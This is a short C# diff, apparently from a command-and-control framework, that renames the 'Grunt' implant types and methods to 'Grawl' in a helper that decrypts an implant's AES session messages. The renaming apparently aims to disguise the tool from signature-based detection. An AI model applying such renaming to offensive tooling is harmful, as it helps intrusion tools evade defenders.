+                return EncryptUtilities.AesDecrypt(data, Convert.FromBase64String(grawl.GrawlNegotiatedSessKEy));
             }
 
-            // Convenience method for decrypting a GruntEncryptedMessage
-            public byte[] GruntSessionDecrypt(APIModels.Grunt grunt, GruntEncryptedMessage gruntEncryptedMessage)
+            // Convenience method for decrypting a GrawlEncMsg
+            public byte[] GrawlSessionDecrypt(APIModels.Grawl grawl, GrawlEncMsg grawlEncMsg)
             {
-                return this.GruntSessionDecrypt(grunt, Convert.FromBase64String(gruntEncryptedMessage.IV)
-                    .Concat(Convert.FromBase64String(gruntEncryptedMessage.EncryptedMessage)).ToArray());
+                return this.GrawlSessionDecrypt(grawl, Convert.FromBase64String(grawlEncMsg.IV)
+                    .Concat(Convert.FromBase64String(grawlEncMsg.EncMsg)).ToArray());
             }
         }
     }
